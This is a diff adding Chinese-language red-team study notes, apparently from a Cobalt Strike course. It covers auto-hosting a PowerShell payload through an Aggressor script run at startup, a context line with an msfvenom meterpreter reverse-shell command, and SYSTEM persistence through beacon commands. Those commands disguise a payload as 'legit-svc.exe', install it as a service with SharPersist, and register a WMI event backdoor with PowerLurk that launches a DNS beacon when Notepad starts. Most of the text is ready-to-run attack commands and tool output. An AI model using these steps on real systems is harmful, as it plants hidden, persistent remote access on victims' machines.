@@ -244,3 +244,110 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=5555 -f dll
 通常我们编写好一个COM组件，都需要注册到注册表中（也可以设置不用注册的COM组件，但是一般都是使用的注册方法），这样当我调用COM组件的这个功能的时候，程序会进注册表进行读取相应位置的DLL或者EXE，加载到进程还是线程中来，供我们使用.
 
 注册表中，LocalServer32键表示可执行（exe）文件的路径、InprocServer32键表示动态链接库（DLL）文件的路径。因为COM函数功能主要是通过这类文件来实现的。
+
+
+# Headless Cobalt Strike
+
+这里我理解是通过脚本在启动CS时自动开启一个钓鱼的host服务
+
+方法：
+创建一个```host_payloads.cna```配置文件
+
+格式：
+```
+# Connected and ready
+on ready {
+
+    # Generate payload
+    ...
+
+    # Host payload
+    ...
+}
+```
+
+
+artifact_payload接受三个参数
+
+- Listener name.
+- Payload type.
+- Payload architecture.
+
+例子如下：
+```
+$payload = artifact_payload("http", "powershell", "x64");
+```
+
+site_host接受7个参数
+
+- Local IP address of the server.
+- Port number to host on.
+- The URI.
+- File content.
+- Mime-type.
+- A friendly description.
+- Use HTTP or HTTPS.
+
+完整配置如下：
+```
+# Connected and ready
+on ready {
+
+    # Generate payload
+    $payload = artifact_payload("http", "powershell", "x64");
+
+    # Host payload
+    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
+}
+```
+
+测试：
+```
+attacker@ubuntu ~/cobaltstrike> ./agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna
+```
+
+添加到启动服务中
+```
+ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
+```
+
+
+# 主机持久性（system）
+
+在之前的主机持久性章节中，我们研究了在用户上下文中获取持久性。但是，在我们提升主机上的权限后，我们还可以添加持久性机制来维护 SYSTEM 访问权限。这允许保持对机器的高级访问，而不必再次利用漏洞（因为它可能会在以后被修补或修复）
+
+要使这些方法起作用，您必须在高完整性 Beacon 中运行
+
+> 请记住，SYSTEM 进程无法对 Web 代理进行身份验证，因此我们不能使用 HTTP 信标。请改用 P2P 或 DNS 信标。
+
+# Windows Services
+
+以system权限运行，新建一个自启服务.新建服务的好处是不会破坏原有的服务。
+```
+beacon> cd C:\Windows
+beacon> upload C:\Payloads\tcp-local_x64.svc.exe
+beacon> mv tcp-local_x64.svc.exe legit-svc.exe
+
+beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+
+[*] INFO: Adding service persistence
+[*] INFO: Command: C:\Windows\legit-svc.exe
+[*] INFO: Command Args: 
+[*] INFO: Service Name: legit-svc
+
+[+] SUCCESS: Service persistence added
+```
+
+# WMI Event Subscriptions
+
+[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)是用于构建这些 WMI 事件的 PowerShell 工具。在本例中，我将一个 DNS 有效负载上传到 Windows 目录，导入 PowerLurk.ps1 并创建一个新的 WMI 事件订阅，该订阅将在记事本启动时执行
+
+```
+beacon> cd C:\Windows
+beacon> upload C:\Payloads\dns_x64.exe
+beacon> powershell-import C:\Tools\PowerLurk.ps1
+beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+
+在 Workstation 2 上打开记事本，将出现 DNS 信标
+
